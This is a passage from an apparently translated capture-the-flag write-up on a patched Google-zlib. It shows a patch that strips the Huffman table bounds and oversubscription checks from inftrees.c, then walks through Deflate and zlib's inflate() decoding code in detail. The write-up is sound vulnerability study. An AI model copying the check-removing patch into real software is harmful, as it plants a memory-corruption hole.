high-speed implementation of&lt;code&gt;inflate&lt;/code&gt;decoding. Under certain conditions,&lt;code&gt;inflate&lt;/code&gt;calls&lt;code&gt;inflate_fast&lt;/code&gt;to decode data.&lt;/quote&gt;&lt;code&gt;From 2c282408771115b3cf80eeb9572927b796ddea79 Mon Sep 17 00:00:00 2001
From: Brendon Tiszka &amp;lt;tiszka@google.com&amp;gt;
Date: Wed, 21 May 2025 15:11:52 +0000
Subject: [PATCH] [google-zlib] Increase Huffman Table Size

The basic idea is to use a bigger root &amp;amp; secondary table for both
dists and lens, allowing us to avoid oversubscription chekcs.
---
 inftrees.c | 18 ------------------
 inftrees.h | 18 +++++-------------
 2 files changed, 5 insertions(+), 31 deletions(-)

diff --git a/inftrees.c b/inftrees.c
index a127e6b..7a8dd2e 100644
--- a/inftrees.c
+++ b/inftrees.c
@@ -122,16 +122,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
         if (count[min] != 0) break;
     if (root &amp;lt; min) root = min;
 
-    /* check for an over-subscribed or incomplete set of lengths */
-    left = 1;
-    for (len = 1; len &amp;lt;= MAXBITS; len++) {
-        left &amp;lt;&amp;lt;= 1;
-        left -= count[len];
-        if (left &amp;lt; 0) return -1;        /* over-subscribed */
-    }
-    if (left &amp;gt; 0 &amp;amp;&amp;amp; (type == CODES || max != 1))
-        return -1;                      /* incomplete set */
-
     /* generate offsets into symbol table for each length for sorting */
     offs[1] = 0;
     for (len = 1; len &amp;lt; MAXBITS; len++)
@@ -200,11 +190,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
     used = 1U &amp;lt;&amp;lt; root;          /* use root table entries */
     mask = used - 1;            /* mask for comparing low */
 
-    /* check available table space */
-    if ((type == LENS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_LENS) ||
-        (type == DISTS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_DISTS))
-        return 1;
-
     /* process all codes and make table entries */
     for (;;) {
         /* create table entry */
@@ -270,9 +255,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
 
             /* check for enough space */
             used += 1U &amp;lt;&amp;lt; curr;
-            if ((type == LENS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_LENS) ||
-                (type == DISTS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_DISTS))
-                return 1;
 
             /* point entry in root table to sub-table */
             low = huff &amp;amp; mask;
diff --git a/inftrees.h b/inftrees.h
index 396f74b..42c2c44 100644
--- a/inftrees.h
+++ b/inftrees.h
@@ -35,19 +35,11 @@ typedef struct {
     01000000 - invalid code
  */
 
-/* Maximum size of the dynamic table.  The maximum number of code structures is
-   1444, which is the sum of 852 for literal/length codes and 592 for distance
-   codes.  These values were found by exhaustive searches using the program
-   examples/enough.c found in the zlib distribution.  The arguments to that
-   program are the number of symbols, the initial root table size, and the
-   maximum bit length of a code.  "enough 286 9 15" for literal/length codes
-   returns 852, and "enough 30 6 15" for distance codes returns 592. The
-   initial root table size (9 or 6) is found in the fifth argument of the
-   inflate_table() calls in inflate.c and infback.c.  If the root table size is
-   changed, then these maximum sizes would be need to be recalculated and
-   updated. */
-#define ENOUGH_LENS 852
-#define ENOUGH_DISTS 592
+/* Memory/speed tradeoff. Alocate more-than-ENOUGH space for LENS and
+   DISTS so we can remove overflow checks from `inflate`.
+*/
+#define ENOUGH_LENS (1 &amp;lt;&amp;lt; 15)
+#define ENOUGH_DISTS (1 &amp;lt;&amp;lt; 15)
 #define ENOUGH (ENOUGH_LENS+ENOUGH_DISTS)
 
 /* Type of code to build for inflate_table() */
-- 
2.50.0.rc0.642.g800a2b2222-goog
&lt;/code&gt;&lt;p&gt;The Google-zlib source shipped with the challenge contains a &lt;code&gt;0001-google-zlib-Increase-Huffman-Table-Size.patch&lt;/code&gt;. From that patch we can see the code has been modified as above.&lt;/p&gt;&lt;p&gt;The patch removes some checks in &lt;code&gt;inftrees.c&lt;/code&gt; and greatly increases the values of &lt;code&gt;ENOUGH_LENS&lt;/code&gt; and &lt;code&gt;ENOUGH_DISTS&lt;/code&gt;. From the comments, the patch increases the sizes of Huffman tables and removes related checks to achieve a memory/speed tradeoff optimization. At this point we don’t yet know exactly what issues this introduces, but it’s clear the vulnerability will be related to Huffman tables and Huffman coding.&lt;/p&gt;&lt;p&gt;Before analyzing the code, let’s review the Deflate compression algorithm. Deflate uses Huffman coding and the LZ77 algorithm to compress data.&lt;/p&gt;&lt;p&gt;The principle of the LZ77 algorithm is very simple: repeated data is replaced by (length, distance) pairs.&lt;/p&gt;&lt;code&gt;ABCDEEABCDFF -&amp;gt; ABCDEE(4,6)FF&lt;/code&gt;&lt;p&gt;The length is how many bytes to copy, and the distance is how far back from the current position the source data lies.&lt;/p&gt;&lt;p&gt;Huffman coding is a bit more involved. The basic idea is to replace original data with compressed bit sequences. While the minimum unit of data is typically a byte (8 bits), replacing values with shorter bit sequences reduces size.&lt;/p&gt;&lt;code&gt;ABABAAAABBBB (12 Byte, 96bit) -&amp;gt; 010100001111 ( 1.5 Byte, 12bit)&lt;/code&gt;&lt;p&gt;In this example there are only two symbols, A and B, which can be encoded with 1-bit Huffman codes (0 and 1). If there are more than two symbols, you obviously cannot compress them all with 1-bit codes.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111

ABCDABCEABC -&amp;gt; 000110110000110111&lt;/code&gt;&lt;quote&gt;&lt;p&gt;As shown, Huffman codes depend on the data being compressed, so to decode the compressed data, you need a table mapping {Huffman code : actual value}.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;A Huffman code cannot be the prefix of another Huffman code. For example, if 111 is a code, then 11 cannot be a code; since codes have variable length, a prefix collision like 1110 would be ambiguous—unclear whether it’s 111 + 0 or 11 + 10.&lt;/p&gt;&lt;p&gt;Also, the minimum and maximum code lengths vary depending on the number of distinct data values. Huffman coding assigns shorter codes (e.g., 2 bits) to high-frequency values (A, B, C) and longer codes (e.g., 3 bits) to low-frequency values (D, E) to compress effectively.&lt;/p&gt;&lt;p&gt;Additionally, consider this: if Deflate generates efficient Huffman codes tailored to the input, then the decoder needs the corresponding Huffman table to decode. Therefore, Deflate uses either fixed Huffman tables or dynamic Huffman tables depending on the situation.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;Fixed Huffman table&lt;/item&gt;&lt;lb/&gt;Predefined in Deflate/Inflate. It doesn’t always give the most efficient compression for the data, but you don’t need to include a Huffman table in the final compressed stream.&lt;item&gt;Dynamic Huffman table&lt;/item&gt;&lt;lb/&gt;Performs optimal Huffman coding for the given data, and includes in the final compressed data the Huffman table necessary to decode it.&lt;/quote&gt;&lt;p&gt;Let’s elaborate on “including the Huffman table in the final compressed data.” In the standard implementation, the Huffman table can be represented using only code lengths.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111&lt;/code&gt;&lt;p&gt;Rather than storing the entire codes as above, you can store just the code lengths:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2
B -&amp;gt; 2
C -&amp;gt; 2
D -&amp;gt; 3
E -&amp;gt; 3&lt;/code&gt;&lt;p&gt;Since actual Huffman codes have lengths in the range 3–15 bits, storing only lengths reduces the size of the embedded Huffman tables.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Separately from using code lengths to compress the Huffman table, Google‑zlib compresses the lengths themselves again using Huffman coding. We’ll discuss this in more detail during the source analysis below.&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;huffman_table['A'] = 2
huffman_table['B'] = 2
huffman_table['C'] = 2
huffman_table['D'] = 3
huffman_table['E'] = 3&lt;/code&gt;&lt;p&gt;This works for a simple reason. A Huffman table is an array indexed by the original symbol. Assign the first 2-bit code 00 to A; then B gets 01, C gets 10, and so on. Using only lengths and order, all codes are recoverable. In other words, if Deflate assigns codes in order, Inflate can reconstruct them from just the lengths.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Deflate uses Huffman coding not only for literal values (0–255), but also for the LZ77 (length, distance) pairs.&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;int ZEXPORT inflate(z_streamp strm, int flush) {
    struct inflate_state FAR *state;
    z_const unsigned char FAR *next;    /* next input */
    unsigned char FAR *put;     /* next output */
    unsigned have, left;        /* available input and output */
    unsigned long hold;         /* bit buffer */
    unsigned bits;              /* bits in bit buffer */
    unsigned in, out;           /* save starting available input and output */
    unsigned copy;              /* number of stored or match bytes to copy */
    unsigned char FAR *from;    /* where to copy match bytes from */
    code here;                  /* current decoding table entry */
    code last;                  /* parent table entry */
    unsigned len;               /* length to copy for repeats, bits to drop */
    int ret;                    /* return code */
#ifdef GUNZIP
    unsigned char hbuf[4];      /* buffer for gzip header crc calculation */
#endif
    static const unsigned short order[19] = /* permutation of code lengths */
        {16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};

    if (inflateStateCheck(strm) || strm-&amp;gt;next_out == Z_NULL ||
        (strm-&amp;gt;next_in == Z_NULL &amp;amp;&amp;amp; strm-&amp;gt;avail_in != 0))
        return Z_STREAM_ERROR;

    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    if (state-&amp;gt;mode == TYPE) state-&amp;gt;mode = TYPEDO;      /* skip check */
    LOAD();
    in = have;
    out = left;
    ret = Z_OK;
    for (;;)
        switch (state-&amp;gt;mode) {
        case HEAD:
            if (state-&amp;gt;wrap == 0) {
                state-&amp;gt;mode = TYPEDO;
                break;
            }
            ...&lt;/code&gt;&lt;p&gt;&lt;code&gt;inflate&lt;/code&gt; is a virtual finite-state machine. It treats the compressed data stream (&lt;code&gt;strm&lt;/code&gt;) as opcodes and executes like a VM. Since &lt;code&gt;inflateInit2_&lt;/code&gt; sets &lt;code&gt;state-&amp;gt;mode = HEAD&lt;/code&gt;, it transitions to &lt;code&gt;state-&amp;gt;mode = TYPEDO&lt;/code&gt;, and then hits the &lt;code&gt;case TYPEDO&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;/* Load registers with state in inflate() for speed */
#define LOAD() \
    do { \
        put = strm-&amp;gt;next_out; \
        left = strm-&amp;gt;avail_out; \
        next = strm-&amp;gt;next_in; \
        have = strm-&amp;gt;avail_in; \
        hold = state-&amp;gt;hold; \
        bits = state-&amp;gt;bits; \
    } while (0)

/* Restore state from registers in inflate() */
#define RESTORE() \
    do { \
        strm-&amp;gt;next_out = put; \
        strm-&amp;gt;avail_out = left; \
        strm-&amp;gt;next_in = next; \
        strm-&amp;gt;avail_in = have; \
        state-&amp;gt;hold = hold; \
        state-&amp;gt;bits = bits; \
    } while (0)&lt;/code&gt;&lt;quote&gt;&lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt;: end pointer of the decompressed output buffer that’s been filled so far&lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt;: remaining size of the decompression buffer&lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt;: end pointer of the processed input data&lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt;: remaining number of input bytes to process&lt;code&gt;state-&amp;gt;hold&lt;/code&gt;: buffer used for bit operations&lt;code&gt;state-&amp;gt;bits&lt;/code&gt;: current bit length stored in&lt;code&gt;state-&amp;gt;hold&lt;/code&gt;&lt;/quote&gt;&lt;p&gt;Before the main loop, let’s note some macros and variables used by Inflate. Members of the &lt;code&gt;strm&lt;/code&gt; structure don’t benefit from register optimization, so these macros copy them into locals for faster operations.&lt;/p&gt;&lt;code&gt;/* Get a byte of input into the bit accumulator, or return from inflate()
   if there is no input available. */
#define PULLBYTE() \
    do { \
        if (have == 0) goto inf_leave; \
        have--; \
        hold += (unsigned long)(*next++) &amp;lt;&amp;lt; bits; \
        bits += 8; \
    } while (0)

/* Assure that there are at least n bits in the bit accumulator.  If there is
   not enough available input to do that, then return from inflate(). */
#define NEEDBITS(n) \
    do { \
        while (bits &amp;lt; (unsigned)(n)) \
            PULLBYTE(); \
    } while (0)

/* Return the low n bits of the bit accumulator (n &amp;lt; 16) */
#define BITS(n) \
    ((unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; (n)) - 1))

/* Remove n bits from the bit accumulator */
#define DROPBITS(n) \
    do { \
        hold &amp;gt;&amp;gt;= (n); \
        bits -= (unsigned)(n); \
    } while (0)&lt;/code&gt;&lt;p&gt;Unlike byte-oriented data, compressed data is processed at bit granularity because of packing and Huffman coding. The Inflate implementation uses macros like these to fill a bit buffer (&lt;code&gt;hold&lt;/code&gt;) and manipulate it bitwise.&lt;/p&gt;&lt;p&gt;The basic logic is: use &lt;code&gt;NEEDBITS&lt;/code&gt; to pull bits from &lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt; (&lt;code&gt;next&lt;/code&gt;) into &lt;code&gt;state-&amp;gt;hold&lt;/code&gt; (&lt;code&gt;hold&lt;/code&gt;), decreasing &lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt; (&lt;code&gt;have&lt;/code&gt;) accordingly. Then extract as many bits as needed with &lt;code&gt;BITS&lt;/code&gt;, and drop consumed bits with &lt;code&gt;DROPBITS&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Using this bit-level handling, the code decodes the compressed data and appends the decoded bytes to &lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt; (&lt;code&gt;put&lt;/code&gt;), decreasing &lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt; (&lt;code&gt;left&lt;/code&gt;) by the number of bytes written.&lt;/p&gt;&lt;code&gt;        case TYPEDO:
            if (state-&amp;gt;last) {
                BYTEBITS();
                state-&amp;gt;mode = CHECK;
                break;
            }
            NEEDBITS(3);
            state-&amp;gt;last = BITS(1);
            DROPBITS(1);
            switch (BITS(2)) {
            case 0:                             /* stored block */
                Tracev((stderr, "inflate:     stored block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = STORED;
                break;
            case 1:                             /* fixed block */
                fixedtables(state);
                Tracev((stderr, "inflate:     fixed codes block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = LEN_;             /* decode codes */
                if (flush == Z_TREES) {
                    DROPBITS(2);
                    goto inf_leave;
                }
                break;
            case 2:                             /* dynamic block */
                Tracev((stderr, "inflate:     dynamic codes block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = TABLE;
                break;
            case 3:
                strm-&amp;gt;msg = (z_const char *)"invalid block type";
                state-&amp;gt;mode = BAD;
            }
            DROPBITS(2);
            break;&lt;/code&gt;&lt;p&gt;Back in &lt;code&gt;inflate&lt;/code&gt;, compressed data is processed in blocks, starting at &lt;code&gt;case TYPEDO&lt;/code&gt;. After ensuring at least 3 bits in the buffer (&lt;code&gt;NEEDBITS(3)&lt;/code&gt;), it reads 1 bit with &lt;code&gt;BITS(1)&lt;/code&gt; to set &lt;code&gt;state-&amp;gt;last&lt;/code&gt;, which indicates whether this block is the last one. It then drops that bit and uses the next two bits to select the block type.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;stored block (0): a block of uncompressed data. When&lt;/item&gt;&lt;code&gt;state-&amp;gt;mode = STORED&lt;/code&gt;, it will directly copy from&lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt;to&lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt;.&lt;item&gt;fixed codes block (1): data compressed with the fixed Huffman table.&lt;/item&gt;&lt;code&gt;fixedtables(state)&lt;/code&gt;builds the fixed table, then&lt;code&gt;state-&amp;gt;mode = LEN_&lt;/code&gt;moves to the Huffman decoding path.&lt;item&gt;dynamic codes block (2): data compressed with a dynamic Huffman table.&lt;/item&gt;&lt;code&gt;state-&amp;gt;mode = TABLE&lt;/code&gt;reads dynamic table info from the compressed stream, constructs the dynamic Huffman table, then proceeds to decode.&lt;/quote&gt;&lt;p&gt;Blocks have the following forms:&lt;/p&gt;&lt;code&gt;[0(stored_bock) + state-&amp;gt;last + length to copy + uncompressed bytes to copy]
[1(fixed codes block) + state-&amp;gt;last + compressed data (Huffman codes) + Huffman code for End of Block]
[2(Dynamic codes block) + state-&amp;gt;last + dynamic table info (Code Huffman table + compressed Literal/Length and Distance Huffman tables) + compressed data (Huffman codes) + Huffman code for End of Block ]&lt;/code&gt;&lt;p&gt;The compressed stream consists of one or more blocks, and &lt;code&gt;inflate&lt;/code&gt; decodes each according to the code above.&lt;/p&gt;&lt;code&gt;        case TABLE:
            NEEDBITS(14);
            state-&amp;gt;nlen = BITS(5) + 257;
            DROPBITS(5);
            state-&amp;gt;ndist = BITS(5) + 1;
            DROPBITS(5);
            state-&amp;gt;ncode = BITS(4) + 4;
            DROPBITS(4);
#ifndef PKZIP_BUG_WORKAROUND
            if (state-&amp;gt;nlen &amp;gt; 286 || state-&amp;gt;ndist &amp;gt; 30) {
                strm-&amp;gt;msg = (z_const char *)"too many length or distance symbols";
                state-&amp;gt;mode = BAD;
                break;
            }
#endif
            Tracev((stderr, "inflate:       table sizes ok\n"));
            state-&amp;gt;have = 0;
            state-&amp;gt;mode = LENLENS;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;Let’s look at how a dynamic Huffman table is built. As noted earlier, a dynamic codes block includes a Code Huffman table, and compressed Literal/Length and Distance tables. The code above reads the lengths for those three tables.&lt;/p&gt;&lt;p&gt;The Literal/Length table contains codes for literal bytes (A, B, …) and for LZ77 lengths; the Distance table holds codes for LZ77 distances. Using these two tables, the decoder performs Huffman and LZ77 decoding. So what is the Code Huffman table? The Literal/Length and Distance tables are stored compressed in the stream—again via Huffman coding. The Code Huffman table is the dynamic Huffman table used to decode the Huffman tables (lengths) themselves.&lt;/p&gt;&lt;code&gt;        case LENLENS:
            while (state-&amp;gt;have &amp;lt; state-&amp;gt;ncode) {
                NEEDBITS(3);
                state-&amp;gt;lens[order[state-&amp;gt;have++]] = (unsigned short)BITS(3);
                DROPBITS(3);
            }
            while (state-&amp;gt;have &amp;lt; 19)
                state-&amp;gt;lens[order[state-&amp;gt;have++]] = 0;
            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 7;
            ret = inflate_table(CODES, state-&amp;gt;lens, 19, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid code lengths set";
                state-&amp;gt;mode = BAD;
                break;
            }
            Tracev((stderr, "inflate:       code lengths ok\n"));
            state-&amp;gt;have = 0;
            state-&amp;gt;mode = CODELENS;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;First, we read the Code Huffman table lengths. We loop &lt;code&gt;state-&amp;gt;ncode&lt;/code&gt; times and read 3 bits each time into &lt;code&gt;state-&amp;gt;lens&lt;/code&gt;. These 3-bit values are code lengths—the Huffman table is represented by lengths, not the full bit patterns, as discussed earlier. Thus, &lt;code&gt;state-&amp;gt;lens&lt;/code&gt; records the Code Huffman table’s code lengths in the &lt;code&gt;order&lt;/code&gt; permutation.&lt;/p&gt;&lt;code&gt;static const unsigned short order[19] = /* permutation of code lengths */
        {16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};&lt;/code&gt;&lt;p&gt;Here, &lt;code&gt;order&lt;/code&gt; reduces the size of the encoded Code Huffman table. The Code table decodes original values 0–18. Storing lengths for all 19 values would be inefficient.&lt;/p&gt;&lt;p&gt;Typically, codes are used more frequently in the same order as &lt;code&gt;order&lt;/code&gt;. If we stored lengths in plain 0–18 order, we’d need to write zeros for many unused values (e.g., 0–15) before the frequently used 16, 17, 18. By ordering them as above, we can store just the lengths for the frequently used codes and leave the rest implicit. The code reflects this: it reads &lt;code&gt;state-&amp;gt;ncode&lt;/code&gt; lengths, and sets the remaining entries to zero.&lt;/p&gt;&lt;p&gt;We then set &lt;code&gt;state-&amp;gt;next&lt;/code&gt; to point into &lt;code&gt;state-&amp;gt;codes&lt;/code&gt;, and call &lt;code&gt;inflate_table&lt;/code&gt; to build the Huffman table. The resulting table is written at &lt;code&gt;state-&amp;gt;next&lt;/code&gt; (&lt;code&gt;state-&amp;gt;lencode&lt;/code&gt;). We’ll cover &lt;code&gt;inflate_table&lt;/code&gt; shortly. For now, note the parameters: &lt;code&gt;CODES&lt;/code&gt; (build the Code table), &lt;code&gt;state-&amp;gt;lens&lt;/code&gt; (length array), &lt;code&gt;19&lt;/code&gt; (number of symbols, 0–18), &lt;code&gt;&amp;amp;(state-&amp;gt;next)&lt;/code&gt; (output pointer for the constructed table), &lt;code&gt;&amp;amp;(state-&amp;gt;lenbits)&lt;/code&gt; (table index bit width—initially 7, but may be adjusted by &lt;code&gt;inflate_table&lt;/code&gt;), and &lt;code&gt;state-&amp;gt;work&lt;/code&gt; (a temporary array for sorting).&lt;/p&gt;&lt;code&gt;        case CODELENS:
            while (state-&amp;gt;have &amp;lt; state-&amp;gt;nlen + state-&amp;gt;ndist) {
                for (;;) {
                    here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];
                    if ((unsigned)(here.bits) &amp;lt;= bits) break;
                    PULLBYTE();
                }
                if (here.val &amp;lt; 16) {
                    DROPBITS(here.bits);
                    state-&amp;gt;lens[state-&amp;gt;have++] = here.val;
                }
                else {
                    if (here.val == 16) {
                        NEEDBITS(here.bits + 2);
                        DROPBITS(here.bits);
                        if (state-&amp;gt;have == 0) {
                            strm-&amp;gt;msg = (z_const char *)"invalid bit length repeat";
                            state-&amp;gt;mode = BAD;
                            break;
                        }
                        len = state-&amp;gt;lens[state-&amp;gt;have - 1];
                        copy = 3 + BITS(2);
                        DROPBITS(2);
                    }
                    else if (here.val == 17) {
                        NEEDBITS(here.bits + 3);
                        DROPBITS(here.bits);
                        len = 0;
                        copy = 3 + BITS(3);
                        DROPBITS(3);
                    }
                    else {
                        NEEDBITS(here.bits + 7);
                        DROPBITS(here.bits);
                        len = 0;
                        copy = 11 + BITS(7);
                        DROPBITS(7);
                    }
                    if (state-&amp;gt;have + copy &amp;gt; state-&amp;gt;nlen + state-&amp;gt;ndist) {
                        strm-&amp;gt;msg = (z_const char *)"invalid bit length repeat";
                        state-&amp;gt;mode = BAD;
                        break;
                    }
                    while (copy--)
                        state-&amp;gt;lens[state-&amp;gt;have++] = (unsigned short)len;
                }
            }

            /* handle error breaks in while */
            if (state-&amp;gt;mode == BAD) break;

            /* check for end-of-block code (better have one) */
            if (state-&amp;gt;lens[256] == 0) {
                strm-&amp;gt;msg = (z_const char *)"invalid code -- missing end-of-block";
                state-&amp;gt;mode = BAD;
                break;
            }

            /* build code tables -- note: do not change the lenbits or distbits
               values here (9 and 6) without reading the comments in inftrees.h
               concerning the ENOUGH constants, which depend on those values */
            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 9;
            ret = inflate_table(LENS, state-&amp;gt;lens, state-&amp;gt;nlen, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/lengths set";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;distbits = 6;
            ret = inflate_table(DISTS, state-&amp;gt;lens + state-&amp;gt;nlen, state-&amp;gt;ndist,
                            &amp;amp;(state-&amp;gt;next), &amp;amp;(state-&amp;gt;distbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid distances set";
                state-&amp;gt;mode = BAD;
                break;
            }
            Tracev((stderr, "inflate:       codes ok\n"));
            state-&amp;gt;mode = LEN_;
            if (flush == Z_TREES) goto inf_leave;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;Once the Code table is built, we decode the compressed lengths of the Literal/Length and Distance tables. We read &lt;code&gt;state-&amp;gt;lenbits&lt;/code&gt; bits and use the Code table &lt;code&gt;state-&amp;gt;lencode&lt;/code&gt; to decode entries, retrieving a &lt;code&gt;code&lt;/code&gt; struct from the table.&lt;/p&gt;&lt;p&gt;Values 0–18 decoded via the Code table are not literal decoded bytes. Based on the code, they behave as follows:&lt;/p&gt;&lt;quote&gt;&lt;item&gt;0–15: literal code lengths 0–15 directly&lt;/item&gt;&lt;item&gt;16: repeat previous length 3–6 times&lt;/item&gt;&lt;item&gt;17: repeat length 0, 3–10 times&lt;/item&gt;&lt;item&gt;18: repeat length 0, 11–138 times&lt;/item&gt;&lt;/quote&gt;&lt;p&gt;Here “original value” refers to the value decoded by Huffman coding, not necessarily the final decompressed byte. Some values (0–15) correspond to actual lengths, others (16–18) are special symbols.&lt;/p&gt;&lt;code&gt;code here;&lt;/code&gt;&lt;p&gt;We’ll explain this struct in the Huffman table construction section. Depending on its members, various actions occur to ultimately decode each value.&lt;/p&gt;&lt;p&gt;As before, we call &lt;code&gt;inflate_table&lt;/code&gt; to build the final &lt;code&gt;state-&amp;gt;lencode&lt;/code&gt; and &lt;code&gt;state-&amp;gt;distcode&lt;/code&gt; tables for Literal/Length and Distance respectively.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The Code table is no longer needed, so overwriting&lt;/p&gt;&lt;code&gt;state-&amp;gt;lencode&lt;/code&gt;is fine.&lt;/quote&gt;&lt;code&gt;        case LEN:
            if (have &amp;gt;= 6 &amp;amp;&amp;amp; left &amp;gt;= 258) {
                RESTORE();
                inflate_fast(strm, out);
                LOAD();
                if (state-&amp;gt;mode == TYPE)
                    state-&amp;gt;back = -1;
                break;
            }
            state-&amp;gt;back = 0;
            for (;;) {
                here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];
                if ((unsigned)(here.bits) &amp;lt;= bits) break;
                PULLBYTE();
            }
            if (here.op &amp;amp;&amp;amp; (here.op &amp;amp; 0xf0) == 0) {
                last = here;
                for (;;) {
                    here = state-&amp;gt;lencode[last.val +
                            (BITS(last.bits + last.op) &amp;gt;&amp;gt; last.bits)];
                    if ((unsigned)(last.bits + here.bits) &amp;lt;= bits) break;
                    PULLBYTE();
                }
                DROPBITS(last.bits);
                state-&amp;gt;back += last.bits;
            }
            DROPBITS(here.bits);
            state-&amp;gt;back += here.bits;
            state-&amp;gt;length = (unsigned)here.val;
            if ((int)(here.op) == 0) {
                Tracevv((stderr, here.val &amp;gt;= 0x20 &amp;amp;&amp;amp; here.val &amp;lt; 0x7f ?
                        "inflate:         literal '%c'\n" :
                        "inflate:         literal 0x%02x\n", here.val));
                state-&amp;gt;mode = LIT;
                break;
            }
            if (here.op &amp;amp; 32) {
                Tracevv((stderr, "inflate:         end of block\n"));
                state-&amp;gt;back = -1;
                state-&amp;gt;mode = TYPE;
                break;
            }
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;extra = (unsigned)(here.op) &amp;amp; 15;
            state-&amp;gt;mode = LENEXT;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;We now enter the decoding process. Again, we fetch a &lt;code&gt;code&lt;/code&gt; from the table and take actions based on its fields to decode the original value.&lt;/p&gt;&lt;code&gt;        case LIT:
            if (left == 0) goto inf_leave;
            *put++ = (unsigned char)(state-&amp;gt;length);
            left--;
            state-&amp;gt;mode = LEN;
            break;&lt;/code&gt;&lt;p&gt;A quick check shows that when &lt;code&gt;here.op == 0&lt;/code&gt;, we switch to &lt;code&gt;state-&amp;gt;mode = LIT&lt;/code&gt; and append &lt;code&gt;here.val&lt;/code&gt; (the literal byte) to &lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt; (&lt;code&gt;put&lt;/code&gt;). Also, &lt;code&gt;here.bits&lt;/code&gt; is the number of bits consumed to decode that symbol; i.e., it’s the code length, and the decoder uses &lt;code&gt;DROPBITS(here.bits)&lt;/code&gt; to consume bits. This is standard Huffman decoding. But there are other decoding forms depending on &lt;code&gt;here.op&lt;/code&gt;—we’ll explain this in the table construction section.&lt;/p&gt;&lt;code&gt;        case LEN:
            if (have &amp;gt;= 6 &amp;amp;&amp;amp; left &amp;gt;= 258) {
                RESTORE();
                inflate_fast(strm, out);
                LOAD();
                if (state-&amp;gt;mode == TYPE)
                    state-&amp;gt;back = -1;
                break;
            }&lt;/code&gt;&lt;p&gt;Back to the code snippet above. If &lt;code&gt;have&lt;/code&gt; and &lt;code&gt;left&lt;/code&gt; are large enough, &lt;code&gt;inflate&lt;/code&gt; calls &lt;code&gt;inflate_fast&lt;/code&gt; for high-speed decoding. The in-function Huffman decoding is slower because it transitions through VM-like states; &lt;code&gt;inflate_fast&lt;/code&gt; operates with full buffers and fewer checks. Therefore, &lt;code&gt;inflate_fast&lt;/code&gt; requires sufficiently large input/output buffers to be safe.&lt;/p&gt;&lt;code&gt;int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
                                unsigned codes, code FAR * FAR *table,
